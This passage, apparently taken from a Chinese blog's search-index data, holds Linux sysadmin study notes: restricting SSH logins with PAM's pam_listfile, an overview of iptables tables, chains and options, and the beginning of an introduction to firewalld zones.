&#x4F7F;&#x7528;jaking2&#x7528;&#x6237;&#x767B;&#x5F55;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x5F53;&#x8F93;&#x5165;&#x6B63;&#x786E;&#x7684;&#x5BC6;&#x7801;&#x540E;&#x4F1A;&#x63D0;&#x793A;&#x5C31;&#x50CF;&#x8F93;&#x5165;&#x4E86;&#x9519;&#x8BEF;&#x7684;&#x5BC6;&#x7801;&#x4E00;&#x6837;&#xFF0C;&#x800C;&#x5728;&#x4F7F;&#x7528;jaking1&#x7528;&#x6237;&#x767B;&#x5F55;&#x5219;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x62D2;&#x7EDD;&#x767B;&#x5F55;&#x7684;&#x63D0;&#x793A;[root@VM2 ~]# ssh jaking2@192.168.10.11jaking2@192.168.10.11&#x2018;s password:Permission denied, please try again.jaking2@192.168.10.11&#x2018;s password:Permission denied, please try again.jaking2@192.168.10.11&#x2018;s password:Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).[root@VM2 ~]# ssh jaking1@192.168.10.11jaking1@192.168.10.11&#x2018;s password:Last login: Thu Aug 12 09:59:05 2021 from 192.168.10.12[jaking1@VM1 ~]$&#x6CE8;&#xFF1A;&#x6B64;&#x5904;&#x5982;&#x679C;root&#x4E5F;&#x4F7F;&#x7528;ssh&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#xFF0C;&#x4E5F;&#x4F1A;&#x53D7;&#x5230;pam_listfile.so&#x9650;&#x5236;&#x7684;&#x3002;&#x5176;&#x5B9E;pam&#x6A21;&#x5757;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#x5957;&#x8DEF;&#x90FD;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x5982;&#x60F3;&#x4E86;&#x89E3;&#x66F4;&#x591A;&#x7684;PAM&#x6A21;&#x5757;&#x7684;&#x7528;&#x6CD5;&#x8BF7;man modules [root@VM2 ~]# ssh root@192.168.10.11root@192.168.10.11&#x2018;s password:Permission denied, please try again.root@192.168.10.11&#x2018;s password:Permission denied, please try again.root@192.168.10.11&#x2018;s password:Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password). &#x6E29;&#x99A8;&#x63D0;&#x793A;&#xFF1A;&#x5982;&#x679C;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#xFF0C;Linux-PAM &#x53EF;&#x80FD;&#x4F1A;&#x6539;&#x53D8;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;&#x8FD9;&#x53D6;&#x51B3;&#x4E8E;&#x4F60;&#x81EA;&#x5DF1;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x4E0D;&#x5B89;&#x5168;(&#x5F00;&#x653E;&#x7CFB;&#x7EDF;)&#x548C;&#x7EDD;&#x5BF9;&#x5B89;&#x5168;(&#x62D2;&#x7EDD;&#x4EFB;&#x4F55;&#x8BBF;&#x95EE;)&#x3002;&#x901A;&#x5E38;&#xFF0C;Linux-PAM &#x5728;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x65F6;&#xFF0C;&#x503E;&#x5411;&#x4E8E;&#x540E;&#x8005;&#x3002;&#x4EFB;&#x4F55;&#x7684;&#x914D;&#x7F6E;&#x9519;&#x8BEF;&#x90FD;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x6574;&#x4E2A;&#x6216;&#x8005;&#x90E8;&#x5206;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#x3002;&#x914D;&#x7F6E; Linux-PAM &#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x9047;&#x5230;&#x6700;&#x5927;&#x7684;&#x95EE;&#x9898;&#x53EF;&#x80FD;&#x5C31;&#x662F; Linux-PAM &#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/pam.d/*&#x88AB;&#x5220;&#x9664;&#x4E86;&#x3002;&#x5982;&#x679C;&#x53D1;&#x751F;&#x8FD9;&#x79CD;&#x4E8B;&#x60C5;&#xFF0C;&#x4F60;&#x7684;&#x7CFB;&#x7EDF;&#x5C31;&#x4F1A;&#x88AB;&#x9501;&#x4F4F;&#x3002;&#x6709;&#x529E;&#x6CD5;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x6062;&#x590D;&#xFF0C;&#x6700;&#x597D;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x7528;&#x4E00;&#x4E2A;&#x5907;&#x4EFD;&#x7684;&#x955C;&#x50CF;&#x6765;&#x6062;&#x590D;&#x7CFB;&#x7EDF;&#xFF0C;&#x6216;&#x8005;&#x767B;&#x5F55;&#x8FDB;&#x5355;&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x6B63;&#x786E;&#x7684;&#x914D;&#x7F6E;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"iptables学习笔记","date":"2022-06-07T04:53:37.000Z","path":"/posts/57bbf635/","text":"iptablesiptables&#x7684;&#x56DB;&#x8868;&#x4E94;&#x94FE; iptables&#x7684;&#x7ED3;&#x6784;&#x662F;&#x7531;talbes&#x7EC4;&#x6210;&#xFF0C;&#x800C;tables&#x662F;&#x7531;&#x94FE;&#x7EC4;&#x6210;&#xFF0C;&#x94FE;&#x53C8;&#x662F;&#x7531;&#x5177;&#x4F53;&#x7684;&#x89C4;&#x5219;&#x7EC4;&#x6210;&#x3002;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x5728;&#x7F16;&#x5199;iptables&#x7684;&#x89C4;&#x5219;&#x65F6;&#xFF0C;&#x8981;&#x5148;&#x6307;&#x5B9A;&#x8868;&#xFF0C;&#x518D;&#x6307;&#x5B9A;&#x94FE;&#x3002;tables&#x7684;&#x4F5C;&#x7528;&#x662F;&#x533A;&#x5206;&#x4E0D;&#x540C;&#x529F;&#x80FD;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x5E76;&#x4E14;&#x5B58;&#x50A8;&#x8FD9;&#x4E9B;&#x89C4;&#x5219;&#x3002; &#x8868;&#x540D; &#x529F;&#x80FD; &#x4F18;&#x5148;&#x7EA7;&#xFF08;&#x4F4E;&#x2013;&gt;&#x9AD8;&#xFF09; &#x5185;&#x5EFA;&#x94FE; filter &#x8D1F;&#x8D23;&#x6570;&#x636E;&#x5305;&#x7684;&#x8FC7;&#x6EE4;&#x529F;&#x80FD;&#xFF0C;&#x9632;&#x706B;&#x5899;&#xFF1B;&#x5185;&#x6838;&#x6A21;&#x5757;&#xFF1A;iptables_filter 4 INPUT&#x3001; OUTPUT&#x3001; FORWARD nat &#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x529F;&#x80FD;&#xFF1B;&#x5185;&#x6838;&#x6A21;&#x5757;&#xFF1A;iptable_nat 3 PREROUTING &#x3001;POSTROUTING&#x3001; OUTPUT mangle &#x62C6;&#x89E3;&#x62A5;&#x6587;&#xFF0C;&#x505A;&#x51FA;&#x4FEE;&#x6539;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x7EC4;&#x88C5;&#x6210;&#x6570;&#x636E;&#x5305;&#x7684;&#x529F;&#x80FD;&#xFF0C;iptable_mangle 2 PREROUTING&#x3001; OUTPUT&#x3001; FORWARD&#x3001; INPUT&#x3001; POSTROUTING raw &#x6570;&#x636E;&#x8DDF;&#x8E2A;&#xFF0C;&#x5173;&#x95ED;nat&#x8868;&#x4E0A;&#x542F;&#x7528;&#x7684;&#x8FDE;&#x63A5;&#x8FFD;&#x8E2A;&#x673A;&#x5236;&#xFF1B;table_raw 1 PREROUTING &#x3001;OUTPUT &#x89C4;&#x5219;&#x94FE; &#x94FE;&#x7C7B;&#x578B; &#x4F5C;&#x7528;&#x57DF; PREROUTING &#x6570;&#x636E;&#x5305;&#x8FDB;&#x5165;&#x8DEF;&#x7531;&#x8868;&#x4E4B;&#x524D; INPUT &#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x8868;&#x540E;&#x76EE;&#x7684;&#x5730;&#x4E3A;&#x672C;&#x673A; OUTPUT &#x7531;&#x672C;&#x673A;&#x4EA7;&#x751F;&#xFF0C;&#x5411;&#x5916;&#x8F6C;&#x53D1; FORWARD &#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x8868;&#x540E;&#xFF0C;&#x76EE;&#x7684;&#x5730;&#x4E0D;&#x4E3A;&#x672C;&#x673A; POSTROUTING &#x53D1;&#x9001;&#x5230;&#x7F51;&#x5361;&#x63A5;&#x53E3;&#x4E4B;&#x524D; &#x94FE;&#x8868;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x987A;&#x5E8F;&#xFF1A; &#x8868;&#x95F4;&#x7684;&#x4F18;&#x5148;&#x987A;&#x5E8F;&#xFF1A;raw &gt; mangle &gt; nat &gt; filter &#x94FE;&#x95F4;&#x7684;&#x4F18;&#x5148;&#x987A;&#x5E8F;&#xFF1A; &#x5165;&#x7AD9;&#x6570;&#x636E;&#xFF1A;PREROUTING &gt; INPUT &#x51FA;&#x7AD9;&#x6570;&#x636E;&#xFF1A;OUTPUT &gt; POSTROUTING &#x8F6C;&#x53D1;&#x6570;&#x636E;&#xFF1A;PREROUTING &gt; FORWARD &gt; POSTROUTING &#x94FE;&#x5185;&#x7684;&#x5339;&#x914D;&#x987A;&#x5E8F;&#xFF1A; &#x81EA;&#x9876;&#x5411;&#x4E0B;&#x6309;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#xFF0C;&#x627E;&#x5230;&#x5339;&#x914D;&#x7684;&#x89C4;&#x5219;&#x5373;&#x505C;&#x6B62;&#xFF08;LOG&#x9009;&#x9879;&#x8868;&#x793A;&#x8BB0;&#x5F55;&#x76F8;&#x5173;&#x65E5;&#x5FD7;&#xFF09; &#x82E5;&#x5728;&#x8BE5;&#x94FE;&#x5185;&#x627E;&#x4E0D;&#x5230;&#x76F8;&#x5339;&#x914D;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x5219;&#x6309;&#x8BE5;&#x94FE;&#x7684;&#x9ED8;&#x8BA4;&#x7B56;&#x7565;&#x5904;&#x7406;&#xFF08;&#x672A;&#x4FEE;&#x6539;&#x7684;&#x72B6;&#x51B5;&#x4E0B;&#xFF0C;&#x9ED8;&#x8BA4;&#x7B56;&#x7565;&#x4E3A;&#x5141;&#x8BB8;&#xFF09; &#x5339;&#x914D;&#x6761;&#x4EF6; &#x6E90;&#x5730;&#x5740;Source IP &#x76EE;&#x6807;&#x5730;&#x5740;Destination IP &#x5904;&#x7406;&#x52A8;&#x4F5C; ACCEPT&#xFF1A;&#x5141;&#x8BB8;&#x6570;&#x636E;&#x5305;&#x901A;&#x8FC7; DROP&#xFF1A;&#x76F4;&#x63A5;&#x4E22;&#x5F03;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x4E0D;&#x7ED9;&#x4EFB;&#x4F55;&#x56DE;&#x5E94;&#x4FE1;&#x606F; REJECT&#xFF1A;&#x62D2;&#x7EDD;&#x6570;&#x636E;&#x5305;&#x901A;&#x8FC7;&#xFF0C;&#x5FC5;&#x8981;&#x65F6;&#x4F1A;&#x7ED9;&#x6570;&#x636E;&#x53D1;&#x9001;&#x7AEF;&#x4E00;&#x4E2A;&#x54CD;&#x5E94;&#x4FE1;&#x606F;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x521A;&#x8BF7;&#x6C42;&#x5C31;&#x4F1A;&#x6536;&#x5230;&#x62D2;&#x7EDD;&#x7684;&#x4FE1;&#x606F;&#x3002; SNAT&#xFF1A;&#x6E90;&#x5730;&#x5740;&#x8F6C;&#x6362;&#xFF0C;&#x89E3;&#x51B3;&#x5185;&#x7F51;&#x7528;&#x6237;&#x7528;&#x540C;&#x4E00;&#x4E2A;&#x516C;&#x7F51;&#x5730;&#x5740;&#x4E0A;&#x7F51;&#x7684;&#x95EE;&#x9898; MASQUERADE&#xFF1A;&#x662F;SNAT&#x7684;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x5F62;&#x5F0F;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x52A8;&#x6001;&#x3001;&#x4E34;&#x65F6;&#x4F1A;&#x53D8;&#x7684;IP&#x4E0A; DNAT&#xFF1A;&#x76EE;&#x6807;&#x5730;&#x5740;&#x8F6C;&#x6362; REDIRECT&#xFF1A;&#x5728;&#x672C;&#x673A;&#x505A;&#x7AEF;&#x53E3;&#x6620;&#x5C04; LOG&#xFF1A;&#x5728;/var/log/messages&#x6587;&#x4EF6;&#x4E2D;&#x8BB0;&#x5F55;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6570;&#x636E;&#x5305;&#x4F20;&#x9012;&#x7ED9;&#x4E0B;&#x4E00;&#x6761;&#x89C4;&#x5219;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x9664;&#x4E86;&#x8BB0;&#x5F55;&#x4EE5;&#x5916;&#x4E0D;&#x5BF9;&#x6570;&#x636E;&#x5305;&#x505A;&#x4EFB;&#x4F55;&#x5176;&#x4ED6;&#x64CD;&#x4F5C;&#xFF0C;&#x4ECD;&#x7136;&#x8BA9;&#x4E0B;&#x4E00;&#x6761;&#x89C4;&#x5219;&#x53BB;&#x5339;&#x914D;&#x3002; &#x9009;&#x9879; -t&#xFF0C;--table&#xFF1A;&#x5BF9;&#x6307;&#x5B9A;&#x7684;&#x8868;table&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;table&#x5FC5;&#x987B;&#x662F;raw&#xFF0C;nat&#xFF0C;filter&#xFF0C;mangle&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x6307;&#x5B9A;-t&#xFF0C;&#x9ED8;&#x8BA4;filter&#x8868; # &#x901A;&#x7528;&#x5339;&#x914D;&#xFF1A;&#x6E90;&#x5730;&#x5740;&#xFF0C;&#x76EE;&#x6807;&#x5730;&#x5740;&#x7684;&#x5339;&#x914D; -p&#xFF1A;&#x6307;&#x5B9A;&#x8981;&#x5339;&#x914D;&#x7684;&#x534F;&#x8BAE;&#x7C7B;&#x578B; -s&#xFF0C;--souce [!] address[/mask]&#xFF1A;&#x628A;&#x6307;&#x5B9A;&#x7684; &#x4E00;&#x4E2A;/&#x4E00;&#x7EC4; &#x5730;&#x5740;&#x4F5C;&#x4E3A;&#x6E90;&#x5730;&#x5740;&#xFF0C;&#x6309;&#x6B64;&#x89C4;&#x5219;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002;&#x5F53;&#x540E;&#x9762;&#x6CA1;&#x6709;maks&#x65F6;&#xFF0C;address&#x662F;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#xFF0C;&#x6BD4;&#x5982;192.168.1.1&#xFF1B;&#x5F53;mask&#x6307;&#x5B9A;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8868;&#x793A;&#x4E00;&#x7EC4;&#x8303;&#x56F4;&#x5185;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6BD4;&#x5982;192.168.1.0/255.255.255.0 -d&#xFF0C;--destination [!] address[/mask]&#xFF1A;&#x6307;&#x5B9A;&#x76EE;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6309;&#x6B64;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4; -i&#xFF0C;--in-interface [!] &lt;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x540D;&#x79F0;&gt;&#xFF1A;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x5305;&#x7684;&#x6765;&#x81EA;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#xFF0C;&#x6BD4;&#x5982;&#x6700;&#x5E38;&#x89C1;&#x7684;eht0&#x3001;ens33&#x3002;&#x8BE5;&#x9009;&#x9879;&#x53EA;&#x5BF9;INPUT&#x3001;FORWARD&#x3001;PREROUTING&#x8FD9;&#x4E09;&#x4E2A;&#x94FE;&#x8D77;&#x4F5C;&#x7528; -o&#xFF0C;--out-interface [!] &lt;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x540D;&#x79F0;&gt;&#xFF1A;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x5305;&#x51FA;&#x53BB;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x3002;&#x53EA;&#x5BF9;OUTPUT&#x3001;FORWARD&#x3001;POSTROUTING&#x4E09;&#x4E2A;&#x94FE;&#x8D77;&#x4F5C;&#x7528;&#x3002; # &#x67E5;&#x770B;&#x7BA1;&#x7406;&#x547D;&#x4EE4; -L&#xFF0C; --list [chain] &#xFF1A;&#x5217;&#x51FA;&#x94FE;chain&#x4E0A;&#x9762;&#x7684;&#x6240;&#x6709;&#x89C4;&#x5219;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x94FE;&#xFF0C;&#x5217;&#x51FA;&#x8868;&#x7684;&#x6240;&#x6709;&#x94FE;&#x6240;&#x6709;&#x89C4;&#x5219;&#x3002; # &#x89C4;&#x5219;&#x7BA1;&#x7406;&#x547D;&#x4EE4; -A&#xFF0C;--append chain rule-specification&#xFF1A;&#x5728;&#x6307;&#x5B9A;&#x94FE;chain&#x7684;&#x672B;&#x5C3E;&#x63D2;&#x5165;&#x6307;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x8FD9;&#x6761;&#x89C4;&#x5219;&#x4F1A;&#x88AB;&#x653E;&#x5230;&#x6700;&#x540E;&#xFF0C;&#x6700;&#x540E;&#x624D;&#x6267;&#x884C;&#x3002; -I&#xFF0C;--insert chain [rulenum] rule-specification&#xFF1A;&#x5728;&#x94FE;chain&#x4E2D;&#x7684;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x6216;&#x591A;&#x6761;&#x89C4;&#x5219;&#x3002;&#x5982;&#x679C;&#x6307;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#x53F7;&#x662F;1&#xFF0C;&#x5219;&#x5728;&#x94FE;&#x7684;&#x5934;&#x90E8;&#x63D2;&#x5165;&#x3002;&#x8FD9;&#x4E5F;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x89C4;&#x5219;&#x53F7;&#x3002; -D&#xFF0C;--delete chain rule-specification/--delete chain rulenum &#xFF1A;&#x5728;&#x6307;&#x5B9A;&#x7684;&#x94FE;chain&#x4E2D;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x6307;&#x5B9A;&#x89C4;&#x5219; -R num&#xFF0C;replays&#xFF1A;&#x66FF;&#x6362;/&#x4FEE;&#x6539;&#x7B2C;&#x51E0;&#x6761;&#x89C4;&#x5219; # &#x94FE;&#x7BA1;&#x7406;&#x547D;&#x4EE4; -P&#xFF0C;--policy chain target&#xFF1A;&#x4E3A;&#x6307;&#x5B9A;&#x7684;&#x94FE;chain&#x8BBE;&#x7F6E;&#x7B56;&#x7565;target&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x53EA;&#x6709;&#x5185;&#x7F6E;&#x7684;&#x94FE;&#x624D;&#x5141;&#x8BB8;&#x6709;&#x7B56;&#x7565;&#xFF0C;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x662F;&#x4E0D;&#x5141;&#x8BB8;&#x7684;&#x3002; -F&#xFF0C;--flush [cahin]&#xFF1A;&#x6E05;&#x7A7A;&#x6307;&#x5B9A;&#x94FE;chain&#x4E0A;&#x9762;&#x7684;&#x6240;&#x6709;&#x89C4;&#x5219;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x94FE;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x6E05;&#x7A7A;&#x6240;&#x6709;&#x94FE;&#x4E0A;&#x7684;&#x89C4;&#x5219; -N&#xFF0C;--new-chain chain&#xFF1A;&#x7528;&#x6307;&#x5B9A;&#x7684;&#x540D;&#x5B57;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x94FE; -X&#xFF0C;--delete-chain [chain]&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684;&#x94FE;&#xFF0C;&#x8FD9;&#x4E2A;&#x94FE;&#x5FC5;&#x987B;&#x6CA1;&#x6709;&#x88AB;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x89C4;&#x5219;&#x5F15;&#x7528;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x6761;&#x4E0A;&#x5FC5;&#x987B;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x89C4;&#x5219;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x94FE;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x5220;&#x9664;&#x6240;&#x6709;&#x7528;&#x6237;&#x94FE; -E&#xFF0C;--rename-chain old-chain new-chain&#xFF1A;&#x91CD;&#x547D;&#x540D;&#x94FE;&#x3002;&#x8FD9;&#x5E76;&#x4E0D;&#x4F1A;&#x5BF9;&#x5185;&#x90E8;&#x94FE;&#x9020;&#x6210;&#x4EFB;&#x4F55;&#x5F71;&#x54CD; -Z&#xFF0C;--zero [chain]&#xFF1A;&#x628A;&#x6307;&#x5B9A;&#x94FE;&#xFF0C;&#x6216;&#x8868;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x94FE;&#x7684;&#x6240;&#x6709;&#x8BA1;&#x6570;&#x5668;&#x6E05;&#x96F6;&#x3002; -j&#xFF0C;--jump target &lt;&#x6307;&#x5B9A;&#x76EE;&#x6807;&gt;&#xFF1A;&#x53CA;&#x6EE1;&#x8DB3;&#x67D0;&#x6761;&#x4EF6;&#x65F6;&#x8BE5;&#x6267;&#x884C;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x52A8;&#x4F5C;&#x3002;target&#x53EF;&#x4EE5;&#x662F;&#x5185;&#x7F6E;&#x7684;&#x76EE;&#x6807;&#xFF0C;&#x6BD4;&#x5982;ACCEPT&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x94FE;&#x3002; &#x683C;&#x5F0F; iptables -t &#x8868;&#x540D; &lt;-A/I/D/R&gt; &#x89C4;&#x5219;&#x94FE;&#x540D; [&#x89C4;&#x5219;&#x53F7;] &lt;-i/o &#x7F51;&#x5361;&#x540D;&gt; -p &#x534F;&#x8BAE;&#x540D; &lt;-s &#x6E90;IP/&#x6E90;&#x5B50;&#x7F51;&gt; --sport &#x6E90;&#x7AEF;&#x53E3; &lt;-d &#x76EE;&#x6807;IP/&#x76EE;&#x6807;&#x5B50;&#x7F51;&gt; --dport &#x76EE;&#x6807;&#x7AEF;&#x53E3; -j &#x52A8;&#x4F5C; iptables-restoreiptables-saveiptstate document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"firewalld学习笔记","date":"2022-06-07T04:53:28.000Z","path":"/posts/c7b4ec91/","text":"FirewallDRHEL 7&#x7CFB;&#x7EDF;&#x4E2D;&#x96C6;&#x6210;&#x4E86;&#x591A;&#x6B3E;&#x9632;&#x706B;&#x5899;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x4E2D;firewalld&#xFF08;Dynamic Firewall Manager of Linux Systems&#xFF0C;Linux&#x7CFB;&#x7EDF;&#x52A8;&#x6001;&#x9632;&#x706B;&#x5899;&#x7BA1;&#x7406;&#x5668;&#xFF09;&#x670D;&#x52A1;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#x9632;&#x706B;&#x5899;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x62E5;&#x6709;&#x57FA;&#x4E8E;CLI&#xFF08;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;&#xFF09;&#x548C;&#x57FA;&#x4E8E;GUI&#xFF08;&#x56FE;&#x5F62;&#x7528;&#x6237;&#x754C;&#x9762;&#xFF09;&#x7684;&#x4E24;&#x79CD;&#x7BA1;&#x7406;&#x65B9;&#x5F0F;&#x3002; FirewallD&#x662F;CentOS 7&#x7684;&#x4E00;&#x5927;&#x7279;&#x6027;&#xFF0C;&#x6700;&#x5927;&#x7684;&#x597D;&#x5904;&#x662F;&#x652F;&#x6301;&#x52A8;&#x6001;&#x66F4;&#x65B0;&#xFF0C;&#x4E0D;&#x7528;&#x91CD;&#x542F;&#x670D;&#x52A1;&#xFF1B;&#x52A0;&#x5165;&#x4E86;&#x9632;&#x706B;&#x5899;&#x201C;zone&#x201D;&#x7684;&#x6982;&#x5FF5; &#x76F8;&#x8F83;&#x4E8E;&#x4F20;&#x7EDF;&#x7684;&#x9632;&#x706B;&#x5899;&#x7BA1;&#x7406;&#x914D;&#x7F6E;&#x5DE5;&#x5177;&#xFF0C;firealld&#x6240;&#x652F;&#x6301;&#x52A8;&#x6001;&#x66F4;&#x65B0;&#x6280;&#x672F;&#x5E76;&#x52A0;&#x5165;&#x4E86;&#x533A;&#x57DF;&#xFF08;zone&#xFF09;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;&#x533A;&#x57DF;&#x5C31;&#x662F;firewalld&#x9884;&#x5148;&#x51C6;&#x5907;&#x4E86;&#x51E0;&#x5957;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x96C6;&#x5408;&#xFF08;&#x7B56;&#x7565;&#x6A21;&#x677F;&#xFF09;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x751F;&#x4EA7;&#x573A;&#x666F;&#x7684;&#x4E0D;&#x540C;&#x800C;&#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;&#x7B56;&#x7565;&#x96C6;&#x5408;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x7684;&#x5FEB;&#x901F;&#x5207;&#x6362;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x6709;&#x4E00;&#x53F0;&#x7B14;&#x8BB0;&#x672C;&#x7535;&#x8111;&#xFF0C;&#x6BCF;&#x5929;&#x90FD;&#x8981;&#x5728;&#x529E;&#x516C;&#x5BA4;&#x3001;&#x5496;&#x5561;&#x5385;&#x548C;&#x5BB6;&#x91CC;&#x4F7F;&#x7528;&#x3002;&#x6309;&#x5E38;&#x7406;&#x6765;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E09;&#x8005;&#x7684;&#x5B89;&#x5168;&#x6027;&#x6309;&#x7167;&#x7531;&#x9AD8;&#x5230;&#x4F4E;&#x7684;&#x987A;&#x5E8F;&#x6765;&#x6392;&#x5217;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x5BB6;&#x5EAD;&#x3001;&#x516C;&#x53F8;&#x529E;&#x516C;&#x5BA4;&#x3001;&#x5496;&#x5561;&#x5385;&#x3002;&#x5F53;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x5E0C;&#x671B;&#x4E3A;&#x8FD9;&#x53F0;&#x7B14;&#x8BB0;&#x672C;&#x7535;&#x8111;&#x6307;&#x5B9A;&#x5982;&#x4E0B;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x89C4;&#x5219;&#xFF1A; &#x5728;&#x5BB6;&#x4E2D;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x6240;&#x6709;&#x670D;&#x52A1;&#xFF1B;&#x5728;&#x529E;&#x516C;&#x5BA4;&#x5185;&#x4EC5;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x5171;&#x4EAB;&#x670D;&#x52A1;&#xFF1B;&#x5728;&#x5496;&#x5561;&#x5385;&#x4EC5;&#x5141;&#x8BB8;&#x4E0A;&#x7F51;&#x6D4F;&#x89C8;&#x3002;&#x5728;&#x4EE5;&#x5F80;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x9891;&#x7E41;&#x7684;&#x624B;&#x52A8;&#x8BBE;&#x7F6E;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x89C4;&#x5219;&#xFF0C;&#x800C;&#x73B0;&#x5728;&#x53EA;&#x9700;&#x8981;&#x9884;&#x8BBE;&#x597D;&#x533A;&#x57DF;&#x96C6;&#x5408;&#xFF0C;&#x7136;&#x540E;&#x53EA;&#x9700;&#x8F7B;&#x70B9;&#x